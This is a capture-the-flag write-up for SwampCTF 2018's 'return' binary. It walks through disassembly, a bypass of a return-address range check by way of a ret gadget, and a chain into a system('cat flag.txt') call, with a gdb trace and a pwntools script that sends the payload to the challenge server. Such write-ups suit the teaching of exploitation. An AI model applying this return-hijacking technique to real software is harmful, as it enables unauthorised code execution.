#For return in swampctf 2018

This is how the program worked.
```
solomonbstoner@swjsUbuntu:~/Downloads$ ./return
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do: 
hello there
Oh no! Your actions are completely ineffective! The allip approaches and as it nears, you feel its musty breath and are paralyzed with fear. It gently caresses your cheek, and you turn and flee the dungeon, leaving the battle to be fought another day...
solomonbstoner@swjsUbuntu:~/Downloads$ 
```
The program reads only up to 50 bytes from your input. Any more than that will be ignored.


### Analysis of the program

This is the portion of the program that read our input and gave the following output. It is part of the `<doBattle>` function.
```
0x804852d:   e8 5e fe ff ff         	call 0x8048390 <read>  ;read(stdin, 0xffffced2, 50 chars)
0x8048532:   83 c4 10               	add esp, 0x10
0x8048535:   8d 45 da               	lea eax, dword [ ebp + 0xffffffda ]
0x8048538:   83 c0 2a               	add eax, 0x2a
0x804853b:   8b 00                  	mov eax, dword [ eax ]
0x804853d:   89 c2                  	mov edx, eax
0x804853f:   b8 95 85 04 08         	mov eax, 0x8048595
0x8048544:   39 c2                  	cmp edx, eax
0x8048546:   76 2b                  	jbe 0x8048573 <doBattle+0x78>
0x8048548:   83 ec 0c               	sub esp, 0xc
0x804854b:   68 4c 87 04 08         	push 0x804874c ; "Oh no! Your actions are completely ineffective! The allip approaches and as it nears, you feel its musty breath and are paralyzed with fear. It gently caresses your cheek, and you turn and flee the dungeon, leaving the battle to be fought another day..."
0x8048550:   e8 5b fe ff ff         	call 0x80483b0 <puts>
```

Something is very perculiar about...
```
0x804853f:   b8 95 85 04 08         	mov eax, 0x8048595
0x8048544:   39 c2                  	cmp edx, eax
0x8048546:   76 2b                  	jbe 0x8048573 <doBattle+0x78>
```
... in that it takes 4 bytes of our input located at `0xffffcefc` and compares it to the value `0x8048595`. If our input is lesser, then it essentially becomes the address to which `<doBattle>` returns after it ends.


This means we have very limited addresses that we can return to, and definitely cannot return to the stack (as it is in address `0xffffced2`). To overcome this problem, I put the return address to `0x8048372:   c3    	ret` from the `<_init>` function. Then we get to return to anywhere we want.

Shall we return to the stack to run a shellcode from there? Would have if I could have. The stack has NX bit set. 
```
solomonbstoner@swjsUbuntu:~/Downloads$ readelf -l return | grep -i "Stack"
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```

Actually, I soon realised there was a function called `<slayTheBeast>`. In it contains these 2 instructions.
```
0x8048615:   68 ea 8a 04 08         	push 0x8048aea ; "cat flag.txt\n"
0x804861a:   e8 a1 fd ff ff         	call 0x80483c0 <system>
```
That is all we need to get a flag printed out; by calling `system("cat flag.txt")`.

### Winning this challenge

This is the format of my input:
```
<42 * 'a'>< 0x8048372 >< 0x8048615 >
```

Let's go for a test run:
```
solomonbstoner@swjsUbuntu:~/Downloads$ echo -e "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x72\x83\x04\x08\x15\x86\x04\x08" > exploit\ for\ return

(gdb) run < exploit\ for\ return
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/solomonbstoner/Downloads/return < exploit\ for\ return
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do: 

Breakpoint 3, 0x0804852d in doBattle ()
=> 0x0804852d <doBattle+50>:	e8 5e fe ff ff	call   0x8048390 <read@plt>
(gdb) c
Continuing.

Breakpoint 2, 0x08048532 in doBattle ()
=> 0x08048532 <doBattle+55>:	83 c4 10	add    esp,0x10
(gdb) x/32x 0xffffced2
0xffffced2:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcee2:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcef2:	0x61616161	0x61616161	0x83726161	0x86150804
0xffffcf02:	0xcf200804	0x0000ffff	0x06370000	0xa000f7e1
0xffffcf12:	0xa000f7fa	0x0000f7fa	0x06370000	0x0001f7e1
0xffffcf22:	0xcfb40000	0xcfbcffff	0x0000ffff	0x00000000
0xffffcf32:	0x00000000	0xa0000000	0xdc04f7fa	0xd000f7ff
0xffffcf42:	0x0000f7ff	0xa0000000	0xa000f7fa	0x0000f7fa
(gdb) c
Continuing.

Breakpoint 5, 0x08048546 in doBattle ()
=> 0x08048546 <doBattle+75>:	76 2b	jbe    0x8048573 <doBattle+120>
(gdb) p/x $eax
$11 = 0x8048595
(gdb) p/x $edx
$12 = 0x8048372
(gdb) c
Continuing.
Your actions take the Allip by surprise, causing it to falter in its attack!  You notice a weakness in the beasts form and see a glimmer of how it might be defeated.

Breakpoint 4, 0x08048596 in doBattle ()
=> 0x08048596 <doBattle+155>:	c3	ret    
(gdb) x/2x $esp
0xffffcefc:	0x08048372	0x08048615
(gdb) ni
0x08048372 in _init ()
=> 0x08048372 <_init+34>:	c3	ret    
(gdb) 
0x08048615 in slayTheBeast ()
=> 0x08048615 <slayTheBeast+58>:	68 ea 8a 04 08	push   0x8048aea
(gdb) 
0x0804861a in slayTheBeast ()
=> 0x0804861a <slayTheBeast+63>:	e8 a1 fd ff ff	call   0x80483c0 <system@plt>
(gdb) 
cat: flag.txt: No such file or directory
```

It worked!!

So, I fed the input into the server, and I got the flag 
```
from pwn import *
shellcode ="\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x72\x83\x04\x08\x15\x86\x04\x08"
p = remote("chal1.swampctf.com", 1802)
print p.recvuntil("what you do:")
p.send(shellcode)
p.interactive()
```
```
solomonbstoner@swjsUbuntu:~/Downloads$ python return.py
[+] Opening connection to chal1.swampctf.com on port 1802: Done
As you stumble through the opening you are confronted with a nearly-immaterial horror: An Allip!  The beast lurches at you; quick! Tell me what you do:
[*] Switching to interactive mode
 
Your actions take the Allip by surprise, causing it to falter in its attack!  You notice a weakness in the beasts form and see a glimmer of how it might be defeated.
flag{f34r_n0t_th3_4nc13n7_R0pn1qu3}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to chal1.swampctf.com port 1802
```

END